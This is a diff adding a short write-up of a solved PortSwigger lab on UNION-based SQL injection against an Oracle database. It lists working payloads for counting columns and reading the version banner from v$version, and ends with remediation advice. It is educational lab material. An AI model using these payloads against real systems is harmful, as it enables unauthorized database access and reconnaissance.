@@ -1,0 +1,46 @@
+Lab 3: SQL Injection - Query Database Version on Oracle
+Platform: PortSwigger Web Security Academy
+Level: Practitioner
+Category: SQL Injection - Examining the Database
+Status: ✅ Solved
+
+Objective
+Determine the database type and version using a UNION-based SQL injection on an Oracle database.
+
+Key Concept
+On Oracle databases, every SELECT statement must include a FROM clause. Oracle has a built-in table called dual used for this purpose.
+
+Steps to Solve
+
+Found the injectable category parameter in the URL
+First determined number of columns by trying:
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3-- (error appeared = 2 columns exist)
+
+Checked which columns accept string data:
+
+' UNION SELECT 'a','a' FROM dual--
+
+Injected payload to retrieve Oracle version:
+
+' UNION SELECT banner,NULL FROM v$version--
+
+The database version string was displayed on the page ✅
+
+
+Tool Used
+
+Burp Suite (request interception and payload injection)
+Browser
+
+
+Impact
+Medium — Database version disclosure helps attackers identify known CVEs and plan further attacks targeting that specific version.
+
+Remediation
+
+Suppress detailed error messages in production
+Use parameterized queries
+Restrict database user privileges (principle of least privilege)
